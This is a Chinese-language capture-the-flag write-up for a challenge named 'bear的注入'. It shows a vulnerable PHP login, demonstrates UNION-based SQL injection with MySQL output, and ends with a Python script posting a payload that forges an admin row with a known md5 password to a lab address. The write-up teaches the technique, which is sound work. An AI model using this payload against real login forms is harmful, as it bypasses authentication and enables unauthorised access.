# bear的注入

## 出题思路

这题需要你知道什么叫联合注入。

## 解题思路

定位到`login.php`中的这一句

```php
$username = $_POST['username'];
$password = $_POST['password'];

$sql="SELECT * FROM users WHERE username='$username'";
```

用户上传的username被拼接到了SQL语句中，这个SQL语句将会被执行，获取符合username的用户

查询到用户之后，将查询到的密码与上传的密码做md5之后比较。

```php
$row["password"] === md5($password) 
```

即使此时我们使用万能密码进行攻击，SQL逻辑如下

```
从users表中查询是否有username = 'admin' 或者 1=1
```

SQL语句的确查询到了结果，但是我们仍然无法通过密码的校验。

这时我们可以使用union联合注入的特性，即(SQL语句1 Union SQL语句2)。

给出一个例子：

```sql
mysql> select * from users;
+----------+--------------+
| username | password     |
+----------+--------------+
| admin    | OhyOuFOuNdit |
+----------+--------------+
1 row in set (0.00 sec)

mysql> select * from users where username = 'admin';
+----------+--------------+
| username | password     |
+----------+--------------+
| admin    | OhyOuFOuNdit |
+----------+--------------+
1 row in set (0.00 sec)

mysql> select * from users where username='admin' union select 'admin','fake_user';
+----------+--------------+
| username | password     |
+----------+--------------+
| admin    | OhyOuFOuNdit |
| admin    | fake_user    |
+----------+--------------+
2 rows in set (0.00 sec)

mysql> select * from users where username='123' union select 'admin','fake_user';
+----------+-----------+
| username | password  |
+----------+-----------+
| admin    | fake_user |
+----------+-----------+
1 row in set (0.00 sec)
```

当我们构造一个不存在的用户名，然后再将我们拼接的用户名和密码做union查询，这时候我们就可以控制我们需要登录的用户了。

SQL语句变化

```sql
SELECT *users where username='admin' union select 'admin', 我们需要上传的password的md5值#
```

## 解题脚本

```python
import requests
import hashlib

url = 'http://192.168.80.128:8858/login.php'

data = {
    'username':"123' union select 'admin', '{}'#".format(hashlib.md5(b'whistle').hexdigest()),
    'password':"whistle"
}

r = requests.post(
    url = url,
    data = data
)

print(r.text)
```

